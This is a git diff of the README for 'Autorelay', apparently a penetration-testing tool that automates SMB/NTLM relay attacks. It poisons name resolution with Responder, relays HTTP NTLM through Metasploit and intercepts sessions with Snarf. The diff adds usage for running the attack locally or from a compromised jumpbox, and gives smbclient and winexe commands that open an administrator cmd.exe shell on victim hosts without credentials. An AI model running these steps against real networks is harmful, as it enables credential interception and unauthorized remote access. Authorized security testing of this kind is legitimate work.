@@ -1,18 +1,25 @@
 # Autorelay
 
-Automatically performs the SMB relay attack. Uses Responder to poison, Metasploit for HTTP NTLM relay (rather than just SMB relay), and Snarf for the MITM'ing. 
+Automatically performs the SMB relay attack either locally or on a remote device. Uses Responder to poison, Metasploit for HTTP NTLM relay (rather than just SMB relay), and Snarf for the MITM'ing. When using locally, only requires an interface and an nmap XML file of the target network to determine SMB hosts. When used for SMB relaying on a jumpbox, requires the IP address of the jumpbox.
 
 
 ## Usage
 
 1. pip install -r requirements
 
-2. python autoresp.py -i [interface] -x [nmap xml file]
+####Remote
 
-3. Point your browser to http://localhost:4001 and refresh it periodically to see your MITM'd connections
+2. python autoresp.py -d [remote server internal IP] -x [nmap xml output file from the remote network] -i [remote device interface]
+
+####Local
+
+2. python autoresp.py -x [nmap xml output file from the remote network] -i [interface]
+
+3. Point your local browser to http://localhost:4001 and refresh it periodically to see your MITM'd connections
 
 4. After a connection is expired (or you expire it), click "choose"
 
-5. On the remote device run: winexe //127.0.0.1 -U "a%a" cmd.exe
+5. Run this command locally if relaying locally or run it on the jumpbox if you're relaying remotely: smbclient -U a%a //127.0.0.1
 
-6. If your SMB connection had admin rights, you now have a shell without any credentials.
+6. Alternatively, if you gain admin rights through the SMB connection spawn a shell with: winexe //127.0.0.1 -U "a%a" cmd.exe
+
